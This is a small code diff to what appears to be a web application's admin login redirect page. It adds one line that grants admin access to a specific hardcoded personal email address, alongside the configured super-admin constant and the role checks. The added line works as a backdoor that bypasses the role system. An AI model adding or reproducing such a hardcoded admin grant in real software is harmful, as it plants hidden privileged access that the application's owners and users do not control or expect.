@@ -13,6 +13,7 @@ export default async function AdminLoginRedirectPage() {
     const payload = await verifyUserSessionToken(userToken);
     if (
       payload?.email?.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase() ||
+      payload?.email?.toLowerCase() === "kimdinhphuong205@gmail.com" ||
       payload?.role === "superadmin" ||
       payload?.role === "admin"
     ) {
